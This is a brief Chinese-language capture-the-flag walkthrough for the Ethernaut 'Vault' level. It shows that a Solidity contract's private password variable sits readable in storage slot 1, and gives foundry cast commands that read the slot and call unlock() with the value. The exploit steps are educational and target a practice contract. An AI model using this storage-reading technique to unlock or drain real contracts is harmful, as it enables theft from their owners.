### 第7关：Vault 

这一关目的是要读取合约中的 bytes32 private password 变量。从代码布局
```solidity
contract Vault {
    bool public locked;
    bytes32 private password;
...
}
```
中我们可以推测出 password 存放在 slot1 中（当然你也可以获取多一些比如 slot0~slot9 来观察一下），



**使用 foundry cast 来读取存储槽1, 得到密码：**
```shell
cast storage 0x目标合约地址 1  --rpc-url=https://blastapi.io
 ```

然后调用 unlock(bytes32 _password) 函数：
 ```shell
cast send 0x目标合约地址 "unlock(bytes32 _password)" 0x12345...67890  --rpc-url=https://public.blastapi.io  --private-key=攻击者私钥
 ```

 点击 Submit Instance, 过关。
